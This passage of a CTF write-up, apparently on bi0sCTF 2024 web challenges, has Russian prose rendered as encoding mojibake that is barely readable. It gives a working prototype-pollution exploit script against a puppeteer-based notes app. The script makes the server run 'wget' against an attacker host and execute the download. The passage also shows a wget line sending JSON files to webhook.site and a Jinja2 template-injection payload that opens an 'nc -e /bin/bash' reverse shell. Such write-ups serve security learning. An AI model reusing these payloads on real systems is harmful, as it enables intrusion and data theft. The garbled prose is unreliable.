–£ –∞–≤—Ç–æ—Ä–∞ –Ω–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –∏—Å–∫–ª—é—á–∏—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –¥–æ–±–∏—Ç—å—Å—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞, –ø–æ—Ç–æ–º—É —á—Ç–æ —É–º–µ–ª—å—Ü–∞–º–∏ –±—ã–ª –Ω–∞–π–¥–µ–Ω –µ—â–µ –æ–¥–∏–Ω –≥–∞–¥–∂–µ—Ç –≤ puppeteer (–º–æ–¥—É–ª—å –±—Ä–∞—É–∑–µ—Ä–æ–º –¥–ª—è —ç–º—É–ª—è—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —á—Ç–æ–±—ã –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å client-side —É—è–∑–≤–∏–º–æ—Å—Ç–∏).
–ò—Ç–æ–≥–æ –Ω–∞–π–¥–µ–Ω—ã —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã:
 > [1](https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/browsers/src/launch.ts#L199-L207)
 ```ts
     this.#browserProcess = childProcess.spawn(
      this.#executablePath,
      this.#args,
      {
        detached: opts.detached,
        env,
        stdio,
      }
    );
 ```
 > [2](https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/puppeteer-core/src/node/ChromeLauncher.ts#L76-L83)
 ```ts
     const {
      ignoreDefaultArgs = false,
      args = [],
      pipe = false,
      debuggingPort,
      channel,
      executablePath,
    } = options;
 ```
 –ò—Ç–æ–≥–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ–º `shell`, –∞—Ç—Ä–∏–±—É—Ç `childProcess` –Ω–∞ sh,  `executablePath` –≤—ã—Å—Ç–∞–≤–ª—è–µ–º –¥–∏—Ä–µ—É–∫—Ç–æ—Ä–∏—é —Å –∑–∞–ø–∏—Å–∫–∞–º–∏, –¥–∞–ª–µ–µ –≤ `debuggingPort` –ø–∏—à–µ–º –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è, –æ–¥–Ω–∞–∫–æ –º—ã –æ–≥—Ä–∞–Ω–∏—á–µ–Ω—ã –ø–æ –¥–ª–∏–Ω–µ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, –ø–æ—ç—Ç–æ–º—É —Ö–æ—Å—Ç–∏–º —É —Å–µ–±—è –Ω–∞ –±–µ–ª–æ–º ip –Ω–∞–≥—Ä—É–∑ `wget https://webhook.site/xxxxx --post-data="$(cat *.json)`, –ø–æ–¥—Ç—è–≥–∏–≤–∞–µ–º –∏ –≤—ã–ø–æ–ª–Ω—è–µ–º

 –∏—Ç–æ–≥–æ–≤—ã–π —Å–ø–ª–æ–π—Ç
 ```py
import httpx

BASE_URL = "http://localhost:3000"

ATTACKER_HOST = "evil.example.com"

client = httpx.Client(base_url=BASE_URL)

def pp(key: str, value: str):
    author = "option(a).constructor.prototype." + key + "=" + value + ""
    assert len(author) <= 86, [author, len(author)]
    res = client.post(
        "/customise",
        json={
            "data": [
                {},
                {
                    "author": author,
                },
            ]
        },
    )
    assert res.json()["Message"] == "Settings changed", res.text
    res = client.post("/create", json={})
    assert res.status_code == 500

pp("shell", '"sh"')
pp("userDataDir", '"/app/notes"')
pp("executablePath", '"echo"')
pp("ignoreDefaultArgs", "true")

pp("debuggingPort", '";cd\\tnotes;a="')
pp("debuggingPort", f'";wget\\t{ATTACKER_HOST}/x;a="')
pp("debuggingPort", '";sh\\tx;"')

res = client.get("/healthcheck")
assert res.json()["Message"] == "healthcheck failed"
 ```

–ø–µ—Ä–µ–¥–æ—Ö–Ω–∏—Ç–µ.
![–æ—Ç–¥—ã—Ö](img/mem5.jpg)

# END
–°–µ–ª —è –∑–∞ —ç—Ç—É —Å—Ç–∞—Ç—å—é —Å–ø—É—Å—Ç—è –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Å—è—Ü–µ–≤ –∏ –ø–æ–Ω—è–ª, —á—Ç–æ –º–Ω–µ –≤ –ø–∞–¥–ª—É –¥–∞–ª—å—à–µ —Ä–∞—Å–ø–∏—Å—ã–≤–∞—Ç—å, —Ç–∞–∫ —á—Ç–æ –ø—Ä–æ—Å—Ç–æ —Å–∫–∏–Ω—É –Ω–∞ –æ—Å—Ç–∞–≤—à–∏–µ—Å—è —Ç–∞—Å–∫–∏ –∞–≤—Ç–æ—Ä—Å–∫–∏–µ —Ä–∞–π—Ç–∞–ø—ã –±–µ–∑ –∞–¥–∞–ø—Ç–∞—Ü–∏–∏.

  - [Image Gallery 1/2](https://blog.bi0s.in/2024/03/06/Web/ImageGallery1-bi0sCTF2024/)
  - [‡¥ï‡µÅ‡¥ü‡µç‡¥ü‡¥ø Notes](https://blog.bi0s.in/2024/02/29/Web/KuttyNotes-bi0sCTF2024/)
  - [Variety Notes](https://blog.bi0s.in/2024/02/26/Web/VarietyNotes-bi0sCTF2024/)
  - [bad notes](https://github.com/teambi0s/bi0sCTF/tree/main/2024/Web/bad_notes)

–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ unintended –Ω–∞ `bad notes`:
```py
Arbitrary file write using "/tmp/test.txt" as filename because the code is using os.path.join (ex: os.path.join("/app/","/tmp/test.txt") => /tmp/test.txt)

Then, you don't have to reach the login page as a GET request, so that flask will not cache the /app/templates/login.html page. (use only POST request in burp repeater for example)

Overwrite /app/templates/login.html with a classic jinja2 rce payload :

{{ self.init.globals.builtins.import('os').popen('nc IP PORT -e /bin/bash').read() }}

Reach the /login page, flask will load the /app/templates/login.html but we have poison it before flask loads it :), get a shell and sudo /bin/cat /flag
```

–í—Å–µ–º —Å–ø–∞—Å–∏–±–æ –≤—Å–µ–º –ø–∞–∫–∞üòò